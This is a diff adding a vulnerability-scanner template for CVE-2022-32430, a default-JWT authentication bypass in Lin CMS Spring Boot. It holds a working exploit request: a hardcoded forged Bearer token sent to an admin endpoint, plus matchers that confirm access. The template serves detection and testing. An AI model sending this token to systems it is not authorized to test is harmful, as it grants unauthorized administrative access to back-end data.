@@ -1,0 +1,32 @@
+id: cve-2022-32430
+info:
+  name: Lin CMS Spring Boot Default JWT Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Lin CMS Spring Boot v0.2.1 has a security vulnerability that allows attackers to use the default JWT Token to access back-end information and functions within the application.
+  tags: permission-bypass
+  reference:
+    - https://www.mesec.cn/archives/277
+http:
+  - raw:
+      - |
+        GET /cms/admin/group/all HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6MSwic2NvcGUiOiJsaW4iLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzUzMTkzNDc5fQ.SesmAnYN5QaHqSqllCInH0kvsMya5vHA1qPHuwCZ8N8
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"id\":"
+          - "\"name\":"
+        condition: and
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?s)\"id\":.*?\"name\":.*"
